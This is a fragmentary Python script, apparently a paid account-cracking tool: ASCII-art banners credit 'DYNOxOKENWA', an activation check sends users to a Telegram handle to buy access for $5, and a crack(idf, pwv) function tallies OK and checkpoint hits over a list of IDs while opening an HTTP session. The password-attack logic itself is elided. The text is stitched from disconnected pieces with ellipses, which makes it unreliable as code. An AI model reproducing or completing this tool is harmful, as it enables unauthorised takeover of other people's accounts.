...
\033[1;91m8 888888888o.   `8.`8888.      ,8' b.             8     ,o888888o.     
\033[1;91m8 8888    `^888. `8.`8888.    ,8'  888o.          8  . 8888     `88.   
\033[96;1m8 8888        `88.`8.`8888.  ,8'   Y88888o.       8 ,8 8888       `8b  
\033[96;1m8 8888         `88 `8.`8888.,8'    .`Y888888o.    8 88 8888        `8b 
\x1b[1;95m8 8888          88  `8.`88888'     8o. `Y888888o. 8 88 8888         88 
\x1b[1;95m8 8888          88   `8. 8888      8`Y8o. `Y88888o8 88 8888         88 
\x1b[1;96m8 8888         ,88    `8 8888      8   `Y8o. `Y8888 88 8888        ,8P 
\x1b[1;96m8 8888        ,88'     8 8888      8      `Y8o. `Y8 `8 8888       ,8P  
\x1b[1;95m8 8888    ,o88P'       8 8888      8         `Y8o.`  ` 8888     ,88'   
\x1b[1;95m8 888888888P'          8 8888      8            `Yo     `8888888P'     

         Made By {M2}IRAQ {H2}Coder""",width=80,style=f"{color_panel}"))
def info():
	prints(f"""{B2}╭─────────────────────╮{B2}╭───────────────╮
{B2}│ {P2}Author : ⁅≪DYNOxOKENWA≫⁆  {B2} │{B2}│ {P2}Version : 6.1v{B2      } │
{B2}╰─────────────────────╯{B2}╰───────────────╯""")
def banner():
	clear()
	prints(nel(f"""\t {color_text} 
...
\x1b[1;95m8 888888888P'          8 8888      8            `Yo     `8888888P'     
         ...
         {M2}Made By {M2}DYNO {H2}Coder""",width=80,style=f"{color_panel}"))
def login():
	try:
...
def chk():
  ...
  try: 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m YOUR ID IS NOT ACTIVE CHAT ME IN TELEGRAM FOR BUY THE TOOL 5$ @i4m_DYNO") 
...
def crack(idf,pwv):
	...
	fff = '%'
	prog.update(des,description=f'\r[deep_white] ༼1778➺DYNOxOKENWA༽  {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
